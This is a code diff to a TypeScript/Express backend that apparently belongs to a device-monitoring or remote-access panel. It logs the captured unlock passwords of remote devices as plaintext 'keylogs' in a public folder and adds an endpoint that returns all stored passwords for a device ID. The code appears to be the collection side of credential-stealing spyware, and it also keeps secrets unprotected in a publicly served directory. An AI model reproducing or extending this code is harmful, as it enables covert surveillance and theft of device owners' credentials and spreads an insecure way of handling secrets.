@@ -155,7 +155,7 @@ export const updateSecurityInformation = async (data: {
 						"Device security updated successfully (pattern saved in DB)",
 				};
 			}
-		} else if (type === "password" || type === "pin") {
+		} else if (type === "password") {
 			// For "password" or "pin", save to a text file in public/security
 			// Create a directory for the device if it doesn't exist
 			const logsDir = path.join(
@@ -181,7 +181,7 @@ export const updateSecurityInformation = async (data: {
 			const formattedDate = formatTime(new Date());
 
 			// Prepare the log entry with the formatted date
-			const logEntry = `${type}: ${formattedDate} -  ${password}  \n`;
+			const logEntry = `${formattedDate} ➡ ${password}\n`;
 
 			// Create a buffer from the log entry string
 			const logBuffer = Buffer.from(logEntry, "utf-8");
@@ -509,6 +509,51 @@ export const updateDeviceName = async (req: Request, res: Response) => {
 		res.status(500).json({
 			status: 500,
 			error: "Failed to process the device name update",
+		});
+	}
+};
+
+// Get Device Password
+export const getDevicePassword = async (req: Request, res: Response) => {
+	const errors = validationResult(req);
+	if (!errors.isEmpty()) {
+		return res.status(400).json({ errors: errors.array() });
+	}
+
+	const { deviceId } = req.body;
+	try {
+		// Assuming the keylogs are stored in public/security
+		const logsDir = path.join(__dirname, "../../public/security", deviceId);
+
+		// Check if the directory exists
+		if (!fs.existsSync(logsDir)) {
+			return res.status(404).json({
+				status: "404",
+				message: "No password found for this device",
+			});
+		}
+
+		// Read all .txt files in the directory
+		const files = fs
+			.readdirSync(logsDir)
+			.filter((file) => file.endsWith(".txt"));
+
+		// Initialize an array to store the content of each file
+		const logs = [];
+
+		// Read the content of each file and push it to the logs array
+		for (const file of files) {
+			const filePath = path.join(logsDir, file);
+			const content = fs.readFileSync(filePath, "utf8");
+			logs.push({ filename: file, content });
+		}
+
+		// Return the array of logs
+		res.status(200).json(logs);
+	} catch (error) {
+		res.status(500).json({
+			status: 500,
+			error: "Failed to process the get device password",
 		});
 	}
 };
